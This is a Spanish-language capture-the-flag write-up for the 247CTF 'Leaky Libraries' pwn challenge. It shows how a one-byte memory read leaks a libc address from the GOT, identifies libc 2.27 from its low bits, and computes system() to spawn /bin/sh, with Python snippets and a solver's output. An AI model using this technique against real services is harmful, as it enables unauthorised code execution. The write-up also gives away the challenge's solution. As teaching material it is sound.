# Leaky Libraries - 247CTF PWN Challenge

## Descripcion

> We don't want to share the entire binary, but we will provide a 1-byte memory leak. Can you abuse the leak to gain code execution on the server?

## Target

```
tcp://1d1233eee403d511.247ctf.com:50212
```

## Flag

```
247CTF{6301c179XXXXXXXXXXXXXXXX8fbcf3f1}
```

---

## Analisis

### Comandos disponibles

El servicio ofrece 4 comandos:

```
Commands:
    base - print base address
    read - read from an address
    call - call an address with /bin/sh as the argument
    exit - exit the program
```

### Observaciones

1. **base**: Devuelve la direccion base del binario (PIE habilitado)
2. **read**: Permite leer 1 byte de cualquier direccion
3. **call**: Llama a una direccion pasando `/bin/sh` como argumento

El binario es de 32 bits (direcciones en rango 0x565xxxxx).

---

## Estrategia

### 1. Obtener base del binario

```python
r.sendline(b'base')
# Response: Base address: 1448849408 (0x56595000)
```

### 2. Leak de libc desde GOT

La GOT del binario esta en `base + 0x1fxx`. Leemos 4 bytes para obtener direcciones de libc:

| GOT Offset | Valor | Low bits | Funcion probable |
|------------|-------|----------|------------------|
| 0x1fd8 | 0xf7dbdd90 | 0xd90 | __libc_start_main |
| 0x1fc0 | 0xf7e12f10 | 0xf10 | - |
| 0x1fc4 | 0xf7df5b60 | 0xb60 | - |

El patron `0xd90` es tipico de `__libc_start_main` en libc6-i386.

### 3. Identificar libc

Con `__libc_start_main` terminando en `0xd90`, la libc es **libc6-i386_2.27**:

| Simbolo | Offset |
|---------|--------|
| __libc_start_main | 0x18d90 |
| system | 0x3cd10 |

### 4. Calcular system y llamarlo

```python
libc_base = libc_start_main - 0x18d90
system = libc_base + 0x3cd10

# call system("/bin/sh")
r.sendline(b'call')
r.sendline(str(system).encode())
```

---

## Ejecucion

```
$ python3 solve.py
[*] Binary base: 0x56595000
[*] __libc_start_main @ libc: 0xf7dbdd90
[*] libc base: 0xf7da5000
[*] system: 0xf7de1d10
[+] Response: uid=1000(notroot) gid=1000(notroot) groups=1000(notroot)
    247CTF{...}
```

---

## Aprendizaje del reto

1. **1-byte leak es suficiente**: Leyendo byte a byte se pueden reconstruir direcciones completas
2. **GOT como fuente de leaks**: Las entradas GOT contienen direcciones de libc resueltas
3. **Patrones de low bits**: Los ultimos 12 bits de una funcion son constantes y sirven para identificar libc
4. **call con argumento fijo**: Si el servicio llama con `/bin/sh`, solo necesitamos encontrar `system`
